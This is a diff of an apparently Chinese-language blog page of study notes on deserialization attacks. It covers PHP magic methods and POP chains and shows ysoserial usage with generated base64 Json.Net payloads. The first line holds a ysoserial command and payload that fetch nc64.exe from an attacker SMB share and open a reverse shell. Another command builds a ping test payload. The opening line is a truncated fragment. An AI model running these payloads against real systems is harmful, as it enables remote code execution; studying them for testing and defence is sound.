+(base) PS D:\Github Study\Ysoserial\ysoserial-1dba9c4416ba6e79b6b262b758fa75e2ee9008e9\Release&gt; .\ysoserial.exe -c &#34;START /B \\10.10.16.155\Enil\nc64.exe 10.10.16.155 443 -e cmd.exe&#34; -o base64 -g ObjectDataProvider -f Json.Net ew0KICAgICckdHlwZSc6J1N5c3RlbS5XaW5kb3dzLkRhdGEuT2JqZWN0RGF0YVByb3ZpZGVyLCBQcmVzZW50YXRpb25GcmFtZXdvcmssIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj0zMWJmMzg1NmFkMzY0ZTM1JywgDQogICAgJ01ldGhvZE5hbWUnOidTdGFydCcsDQogICAgJ01ldGhvZFBhcmFtZXRlcnMnOnsNCiAgICAgICAgJyR0eXBlJzonU3lzdGVtLkNvbGxlY3Rpb25zLkFycmF5TGlzdCwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5JywNCiAgICAgICAgJyR2YWx1ZXMnOlsnY21kJywgJy9jIFNUQVJUIC9CIFxcXFwxMC4xMC4xNi4xNTVcXEVuaWxcXG5jNjQuZXhlIDEwLjEwLjE2LjE1NSA0NDMgLWUgY21kLmV4ZSddDQogICAgfSwNCiAgICAnT2JqZWN0SW5zdGFuY2UnOnsnJHR5cGUnOidTeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2VzcywgU3lzdGVtLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OSd9DQp9 -c：表示 command，指定执行的系统命令">
 
 
 
@@ -156,6 +156,14 @@ ViewState 反序列化攻击
                 <div class="toc-title">Table of Contents</div>
                     <nav id="TableOfContents">
   <ul>
+    <li><a href="#原理">原理</a></li>
+    <li><a href="#php-反序列化">PHP 反序列化</a>
+      <ul>
+        <li><a href="#入口与魔术方法">入口与魔术方法</a></li>
+        <li><a href="#pop-链面向属性编程">POP 链（面向属性编程）</a></li>
+        <li><a href="#序列化格式可篡改">序列化格式可篡改</a></li>
+      </ul>
+    </li>
     <li><a href="#ysoserial">Ysoserial</a></li>
   </ul>
 </nav>
@@ -164,7 +172,24 @@ ViewState 反序列化攻击
             
 
             <div class="post-content">
-                <h2 id="ysoserial">Ysoserial</h2>
+                <h2 id="原理">原理</h2>
+<p>序列化是把内存里的对象转成可储存、可传输的字节流或字符串；反序列化时反过来，根据这船数据把对象重建出来。这本身是个正常的功能，用于跨进程、跨网络传递对象状态。</p>
+<p>反序列化不是被动地读数据，而是主动地重建对象。在重建地过程中，程序会自动实例化数据里指定地类、填充它的属性，而且很多语言会在这个过程里自动调用一些特殊方法（魔术方法/回调），比如 PHP 地 <code>__wakeup</code>、<code>destruct</code>，Java 的 <code>readObject</code>。</p>
+<p>如果攻击者能控制被反序列化的数据，他就控制了哪个类被实例化、属性时什么值。于是他可以挑选程序里已有的、危险的类，拼装处一条从魔术方法触发、一步步调用到危险操作（如执行命令、写文件）的调用链，这就是 gadget chain（利用链/POP 链）。攻击者没有注入新代码，而是把目标程序里已经存在的代码片段当积木重新编排，最后拼处 RCE。</p>
+<h2 id="php-反序列化">PHP 反序列化</h2>
+<h3 id="入口与魔术方法">入口与魔术方法</h3>
+<p>入口是 <code>unserialize()</code> 处理了用户可控数据。触发链靠魔术方法，按什么时候被调用分为：</p>
+<ul>
+<li><code>__wakeup()</code>：反序列化时自动调用</li>
+<li><code>__destruct()</code>：对象被销毁时调用（脚本结束时必触发，是常用的链起点）</li>
+<li><code>__toString()</code>：对象当字符串使用</li>
+<li><code>__get()</code>、<code>__set()</code>、<code>__call()</code>：访问不存在的属性/方法时</li>
+</ul>
+<h3 id="pop-链面向属性编程">POP 链（面向属性编程）</h3>
+<p>单个魔术方法往往不能达成目的，以某个魔术方法为起点，精心构造的对象属性，让它去调用另一个对象方法，层层传递，最终达到一个能执行命令或写文件的危险终点。比如 <code>__destruct</code> 里调用了 <code>$this -&gt; obj -&gt; close()</code>，而把 <code>obj</code> 控制成另一个 <code>close</code> 里有危险操作的类。</p>
+<h3 id="序列化格式可篡改">序列化格式可篡改</h3>
+<p>PHP 序列化是明文可读的，<code>O:4:&quot;User&quot;:2:{s:4:&quot;name&quot;;s:5:&quot;admin&quot;;...}</code>。<code>O</code> 是对象、<code>4</code> 是类名长度、<code>2</code> 是属性个数。攻击者可以直接修改属性值、类型、甚至属性个数。</p>
+<h2 id="ysoserial">Ysoserial</h2>
 <p>使用 ping 命令做简化的 payload，验证是否存在反序列化漏洞。</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">(</span>base<span style="color:#f92672">)</span> PS D:<span style="color:#ae81ff">\G</span>ithub Study<span style="color:#ae81ff">\Y</span>soserial<span style="color:#ae81ff">\y</span>soserial-1dba9c4416ba6e79b6b262b758fa75e2ee9008e9<span style="color:#ae81ff">\R</span>elease&gt; .<span style="color:#ae81ff">\y</span>soserial.exe -c <span style="color:#e6db74">&#34;ping -n 10 10.10.16.155&#34;</span> -o base64 -g ObjectDataProvider -f Json.Net
 </span></span><span style="display:flex;"><span>ew0KICAgICckdHlwZSc6J1N5c3RlbS5XaW5kb3dzLkRhdGEuT2JqZWN0RGF0YVByb3ZpZGVyLCBQcmVzZW50YXRpb25GcmFtZXdvcmssIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj0zMWJmMzg1NmFkMzY0ZTM1JywgDQogICAgJ01ldGhvZE5hbWUnOidTdGFydCcsDQogICAgJ01ldGhvZFBhcmFtZXRlcnMnOnsNCiAgICAgICAgJyR0eXBlJzonU3lzdGVtLkNvbGxlY3Rpb25zLkFycmF5TGlzdCwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5JywNCiAgICAgICAgJyR2YWx1ZXMnOlsnY21kJywgJy9jIHBpbmcgLW4gMTAgMTAuMTAuMTYuMTU1J10NCiAgICB9LA0KICAgICdPYmplY3RJbnN0YW5jZSc6eyckdHlwZSc6J1N5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzLCBTeXN0ZW0sIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5J30NCn0<span style="color:#f92672">=</span>
